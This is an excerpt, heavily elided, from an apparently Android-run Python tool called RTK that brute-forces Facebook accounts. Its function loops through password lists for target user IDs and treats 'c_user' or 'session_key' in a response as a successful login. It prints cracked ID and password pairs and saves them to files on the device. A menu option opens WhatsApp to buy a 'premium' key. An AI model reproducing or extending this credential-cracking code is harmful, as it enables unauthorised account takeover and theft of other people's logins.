...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+8801953289111&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi RTK Sir, I Need To Buy Your Paid RTK PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python RTK.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RTK-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [RTK-OK] %s | %s'%(ids,pas))

                                open('/sdcard/RTK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [RTK-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/RTK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [RTK-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/RTK-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [RTK-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/RTK-OK.txt','a').write(uid+'|'+pas+'\n')
